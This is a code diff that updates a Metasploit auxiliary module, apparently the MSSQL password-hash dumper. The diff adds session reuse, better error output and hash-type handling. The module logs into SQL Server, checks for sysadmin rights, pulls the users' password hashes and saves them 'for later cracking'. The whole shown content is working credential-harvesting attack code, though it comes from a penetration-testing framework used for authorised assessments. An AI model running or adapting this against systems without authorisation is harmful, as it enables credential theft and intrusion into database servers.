@@ -1,18 +1,13 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::MSSQL
   include Msf::Auxiliary::Report
-
   include Msf::Auxiliary::Scanner
+  include Msf::OptionalSession::MSSQL
 
   def initialize
     super(
@@ -29,15 +24,21 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
-    if !mssql_login_datastore
-      print_error("Invalid SQL Server credentials")
+    if session
+      set_mssql_session(session.client)
+    elsif !mssql_login(datastore['USERNAME'], datastore['PASSWORD'])
+      info = self.mssql_client.initial_connection_info
+      if info[:errors] && !info[:errors].empty?
+        info[:errors].each do |err|
+          print_error(err)
+        end
+      end
       return
     end
 
     service_data = {
         address: ip,
-        port: rport,
+        port: mssql_client.peerport,
         service_name: 'mssql',
         protocol: 'tcp',
         workspace_id: myworkspace_id
@@ -75,14 +76,15 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
 
     # Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
-    instancename= mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')[1]
+    instance_info = mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')
+    instancename = instance_info[1] || instance_info[0]
     print_status("Instance Name: #{instancename.inspect}")
     version = mssql_query(mssql_sql_info())[:rows][0][0]
     version_year = version.split('-')[0].slice(/\d\d\d\d/)
 
     unless is_sysadmin == 0
       mssql_hashes = mssql_hashdump(version_year)
-      unless mssql_hashes.nil?
+      unless mssql_hashes.nil? || mssql_hashes.empty?
         report_hashes(mssql_hashes,version_year)
       end
     end
@@ -92,33 +94,25 @@ class MetasploitModule < Msf::Auxiliary
   # Stores the grabbed hashes as loot for later cracking
   # The hash format is slightly different between 2k and 2k5/2k8
   def report_hashes(mssql_hashes, version_year)
-
     case version_year
     when "2000"
       hashtype = "mssql"
-
     when "2005", "2008"
       hashtype = "mssql05"
-    when "2012", "2014"
+    else
       hashtype = "mssql12"
     end
 
     this_service = report_service(
-          :host  => datastore['RHOST'],
-          :port => datastore['RPORT'],
+          :host  => mssql_client.peerhost,
+          :port => mssql_client.peerport,
           :name => 'mssql',
           :proto => 'tcp'
           )
 
-    tbl = Rex::Text::Table.new(
-      'Header'  => 'MS SQL Server Hashes',
-      'Indent'   => 1,
-      'Columns' => ['Username', 'Hash']
-    )
-
     service_data = {
-        address: ::Rex::Socket.getaddress(rhost,true),
-        port: rport,
+        address: ::Rex::Socket.getaddress(mssql_client.peerhost,true),
+        port: mssql_client.peerport,
         service_name: 'mssql',
         protocol: 'tcp',
         workspace_id: myworkspace_id
@@ -128,12 +122,15 @@ class MetasploitModule < Msf::Auxiliary
       next if row[0].nil? or row[1].nil?
       next if row[0].empty? or row[1].empty?
 
+      username = row[0]
+      upcase_hash = "0x#{row[1].upcase}"
+
       credential_data = {
           module_fullname: self.fullname,
           origin_type: :service,
           private_type: :nonreplayable_hash,
-          private_data: "0x#{row[1]}",
-          username: row[0],
+          private_data: upcase_hash,
+          username: username,
           jtr_format: hashtype
       }
 
@@ -149,8 +146,7 @@ class MetasploitModule < Msf::Auxiliary
       login_data.merge!(service_data)
       login = create_credential_login(login_data)
 
-      tbl << [row[0], row[1]]
-      print_good("Saving #{hashtype} = #{row[0]}:#{row[1]}")
+      print_good("Saving #{hashtype} = #{username}:#{upcase_hash}")
     end
   end
 
@@ -167,14 +163,11 @@ class MetasploitModule < Msf::Auxiliary
     case version_year
     when "2000"
       results = mssql_query(mssql_2k_password_hashes())[:rows]
-
-    when "2005", "2008", "2012", "2014"
+    else
       results = mssql_query(mssql_2k5_password_hashes())[:rows]
     end
 
     return results
 
   end
-
-
 end
